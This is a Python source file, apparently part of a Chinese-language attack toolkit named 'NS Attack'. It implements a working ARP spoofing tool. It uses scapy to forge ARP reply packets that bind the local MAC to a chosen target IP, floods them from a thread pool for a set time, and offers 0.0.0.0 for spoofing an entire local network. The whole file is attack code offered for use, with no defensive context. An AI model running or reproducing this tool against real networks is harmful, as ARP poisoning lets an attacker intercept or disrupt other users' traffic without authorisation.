from concurrent.futures import ThreadPoolExecutor
from scapy.layers.l2 import ARP
from scapy.layers.inet import getmacbyip
from scapy.sendrecv import sr1
from multilogging import multilogger

import socket
import time
import sys
import threading
import re
import os

total: int
timesup: bool
selfip: str
selfmac: str
logger = multilogger(name="NS Attack", payload="ARP", notime=True)


def init():
    global total, timesup, selfip, selfmac
    logger.info("初始化 ARP 欺骗中...")
    selfip = socket.gethostbyname(socket.gethostname())
    selfmac = getmacbyip(selfip)
    logger.info(f"获得本机 IP 地址: {selfip}")
    logger.info(f"获得本机 MAC 地址: {selfmac}")
    total = 0
    timesup = False
    logger.info("ARP 欺骗模块初始化完毕.")


def _send_arp_package(target):
    global total, timesup
    arp = ARP(psrc=selfip, hwsrc=selfmac, pdst=target, op=2)
    while not timesup:
        sr1(arp, verbose=0, retry=0, timeout=0)
        total += 1
        logger.info(f"进行 {total} 次 ARP 欺骗...")


def send_arp_package(target):
    try:
        _send_arp_package(target)
    except Exception as error:
        logger.exception(error)


def timer(uptime):
    global timesup
    if uptime > 0:
        time.sleep(uptime)
        timesup = True
        logger.info("时长抵达既定上限, 递交中止 ARP 欺骗请求.")


def attack(target, limit=100, uptime=30):
    global timesup

    logger.info("开始启动 ARP 欺骗线程.")
    logger.info(f"线程池: {limit}.")
    logger.info(f"既定欺骗时长: {uptime}")

    threadpool = ThreadPoolExecutor(max_workers=os.cpu_count() * 3)

    timerthread = threading.Thread(target=lambda: timer(uptime))
    timerthread.daemon = True
    timerthread.start()

    for _ in range(os.cpu_count() * 3):
        threadpool.submit(send_arp_package, target)

    while not timesup:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            break

    timesup = True
    threadpool.shutdown()

    logger.info("ARP 欺骗已终止.")


def main(limit=100, uptime=1000000):
    from prompt_toolkit import prompt

    init()

    try:
        while True:
            target = prompt("目标地址 >>> ")
            if not target or target == "0":
                target = "0.0.0.0"
                break
            elif target.lower() in ["exit", "cancel", "no"]:
                logger.info("用户取消了发起 ARP 欺骗.")
                sys.exit()

            if not re.match(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", target):
                logger.critical("错误的目标地址, 目标地址应该为类 IPv4 参数, 使用`0.0.0.0`进行局域网覆盖欺骗.")
                continue

            break
    except KeyboardInterrupt:
        logger.info("用户要求中止 ARP 欺骗.")
        sys.exit()
    except Exception as error:
        logger.exception(error)
        sys.exit()

    attack(target, limit=limit, uptime=uptime)


if __name__ == "__main__":
    main()
